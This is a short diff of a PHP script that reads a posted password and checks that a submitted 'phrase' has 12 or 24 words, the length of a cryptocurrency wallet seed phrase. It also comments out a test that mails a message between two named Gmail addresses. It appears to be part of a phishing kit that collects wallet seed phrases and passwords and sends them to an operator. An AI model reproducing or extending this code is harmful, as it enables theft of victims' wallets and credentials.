@@ -10,22 +10,22 @@ $password=$_POST['password'];
 
 
 
-ini_set( 'display_errors', 1 );
-error_reporting( E_ALL );
-$from = "renarddrakeintl@gmail.com";
-$to = "olamilekan1312@gmail.com";
-$subject = "Checking PHP mail";
-$message = "PHP mail works just fine";
-$headers = "From:" . $from;
-if(mail($to,$subject,$message, $headers)) {
-    echo "The email message was sent.";
-} else {
-    echo "The email message was not sent.";
-}
+// ini_set( 'display_errors', 1 );
+// error_reporting( E_ALL );
+// $from = "renarddrakeintl@gmail.com";
+// $to = "olamilekan1312@gmail.com";
+// $subject = "Checking PHP mail";
+// $message = "PHP mail works just fine";
+// $headers = "From:" . $from;
+// if(mail($to,$subject,$message, $headers)) {
+//     echo "The email message was sent.";
+// } else {
+//     echo "The email message was not sent.";
+// }
 
 
 
-// // VALIDATING TEXTAREA
+
 
 // if (trim($_POST['phrase']) &&  str_word_count($phrase) != 12 && str_word_count($phrase) != 24  ) {
 
